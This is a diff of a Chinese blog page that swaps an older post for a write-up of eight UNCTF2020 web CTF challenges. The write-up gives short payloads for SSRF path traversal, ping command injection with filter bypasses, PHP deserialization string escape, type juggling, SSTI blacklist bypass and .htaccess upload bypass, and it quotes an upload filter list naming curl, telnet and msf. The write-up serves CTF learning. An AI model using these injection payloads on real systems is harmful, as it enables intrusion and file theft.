@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">[De1CTF 2019]SSRF Me | Troy3e</title>
+  <title itemprop="name">UNCTF2020复现 | Troy3e</title>
   
     <link rel="shortcut icon" href="/images/favicon.ico">
   
@@ -346,11 +346,11 @@
 
   <div class="pattern-center single-center">
     <!-- 有配图默认渲染第一张 -->
-    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-278051.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-278051.jpg">
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1113441.jpg);" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1113441.jpg">
     </div>
     <header class="pattern-header single-header">
       <h1 class="entry-title">
-      [De1CTF 2019]SSRF Me</h1>
+      UNCTF2020复现</h1>
       <p class="entry-census">
         <span>
           <a href="">
@@ -362,7 +362,7 @@
         </span>
         <span class="bull">
         ·</span>
-        2020-7-9<span class="bull">
+        2020-11-17<span class="bull">
         ·</span>
       <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
@@ -376,8 +376,50 @@
         <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
         
         <div class="entry-content">
-          <p>直接给出了源码：<br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200709153859.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200709153915.png" alt=""><br><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20200709153928.png" alt=""></p>
-<p>太烦了直接看了wp。。。<br>这道题讲也讲不明白，就当跳过吧。</p>
+          <p>这比赛没报上名，借的别人的号看了看觉得题挺不错的，结束以后正好官方给了复现环境，打打基础准备接下来的NCTF和HECTF。</p>
+<p>一、easy_ssrf</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201116141753.png" alt=""></p>
+<p>payload：url=/unctf.com/../flag</p>
+<p>考点：file_get_contents使用不存在的协议名导致目录穿越，实现SSRF<br>php源码中，在向目标请求时先会判断使用的协议。如果协议无法识别，就会认为它是个目录。</p>
+<p>FILTER_VALIDATE_URL 过滤器把值作为 URL 来验证。<a href="https://www.runoob.com/php/filter-validate-url.html">https://www.runoob.com/php/filter-validate-url.html</a></p>
+<p>题目中要求url中存在 unctf.com<br>我们可以构造类似 unctf.com/../ 这样的url，又因为我们需要查看flag文件</p>
+<p>最终payload为 url=unctf.com/../flag</p>
+<p>二、UN’s_online_tools</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201116161548.png" alt=""></p>
+<p>ping命令执行的绕过，就那么几样东西。<br>首先127.0.0.1||ls看到目录下的index.php和style.css<br>cat index.php显示非法字符<br>127.0.0.1|ca\t&lt;index.php<br>成功绕过看到源码：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720201116161936.png" alt=""></p>
+<p>payload：url=127.0.0.1|ta\c%09../../../fla%3F </p>
+<p>三、babyeval</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201116225325.png" alt=""></p>
+<p>过滤了括号，以及返回的内容中不能含有flag</p>
+<p>a=include “php://filter/read=convert.base64-encode/resource=flag.php”;</p>
+<p>四、ezfind</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117121654.png" alt=""></p>
+<p><a href="http://2b4e0d94-c2fd-4aa6-ba2c-af5528e74031.node1.hackingfor.fun/index.php?name[]=1">http://2b4e0d94-c2fd-4aa6-ba2c-af5528e74031.node1.hackingfor.fun/index.php?name[]=1</a></p>
+<p>随便传个数组就绕过了，不知道咋回事，应该是非预期。<br>等wp出来看看预期解。</p>
+<p>五、easyunserialize</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117122155.png" alt=""></p>
+<p>明显的反序列化+字符串逃逸<br>最基础的<br>payload：#1=challengechallengechallengechallengechallengechallengechallengechallenge”;s:8:”password”;i:1;}”;s:8:”password”;s:4:”easy”;}aaa</p>
+<p>六、ezphp</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117130234.png" alt=""></p>
+<p>payload：data=a:2:{s:8:”username”;b:1;s:8:”password”;b:1;}</p>
+<p>这个上来乍一看直接让username=admin，password=password就行。但一波操作之后发现不行。<br>仔细研究发现如果是username数据类型是a的话$data_unserialzie[‘username’]的值是不存在的，这里我也不是很清楚。<br>去网上找了下数据类型</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117133511.png" alt=""></p>
+<p>bool类型的true跟任意字符串可以弱类型相等，即得出上面的payload。</p>
+<p>七、easyflask</p>
+<p>提示要以admin登录<br>由于题目是flask直接找到/register和/login<br>注册登录居然直接成功，然后在首页看到了这个</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117205801.png" alt=""></p>
+<p>访问提示you should ‘guess’ the secret number</p>
+<p>尝试：/secret_route_you_do_not_know?guess=49</p>
+<p>返回49 error!!<br>存在ssti<br>拿了个库存的paylaod打算一把梭，然后发现有黑名单，单引号、下划线、方括号。<br>都是常见的绕过，也没什么难的，稍微改改就行。<br>[]可以用getitem()：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117225350.png" alt=""></p>
+<p>__ 和 “(引号)可以用|attr绕过，例：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117225410.png" alt=""></p>
+<p><img src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20201117222120.png" alt=""></p>
+<p>八、easy_upload</p>
+<p>perl|pyth|ph|auto|curl|base||&gt;|rm|ryby|openssl|war|lua|msf|xter|telnet in contents!</p>
+<p>可以传htaccess，由于过滤了php，换行绕过即可。</p>
+<p>到此最基础的送分题应该是做完了，收获还是很大的，对我目前最弱的php的一些基础有了很大的提升（本地试了好多payload），同时复习了一遍各种绕过。最后感谢一下UNCTF的师傅们赛后还提供了复现环境。</p>
 
         </div>
         <!-- .entry-content -->
@@ -406,36 +448,19 @@
       <div class="toc" style="background: none;"></div>
       <section class="post-squares nextprev">
         
-          
-            <div class="post-nepre half previous">
-          
-            <a href="/2020/07/09/GXYCTF2019-%E7%A6%81%E6%AD%A2%E5%A5%97%E5%A8%83/" rel="prev">
-              <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-585070.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-585070.jpg">
-              </div>
-              <span class="label">
-              Previous Post</span>
-              <div class="info">
-                <h3>
-                [GXYCTF2019]禁止套娃</h3>
-                <hr>
-              </div>
-            </a>
-          </div>
-        
         
           
-            <div class="post-nepre half next">
+            <div class="post-nepre full next">
           
-            <a href="/2020/07/08/0CTF-2016-piapiapia/" rel="next">
+            <a href="/2020/11/07/HarekazeCTF2019-Easy-Notes/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-789452.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-789452.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1111656.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1111656.jpg">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                [0CTF 2016]piapiapia</h3>
+                [HarekazeCTF2019]Easy Notes</h3>
                 <hr>
               </div>
             </a>
@@ -468,7 +493,7 @@
           </div>
         </div>
         <hr>
-        <p><i class="iconfont icon-write"></i></p>
+        <p><i class="iconfont icon-write"></i>steamID：888007034</p>
       </section>
     </main><!-- #main -->
   </div><!-- #primary -->
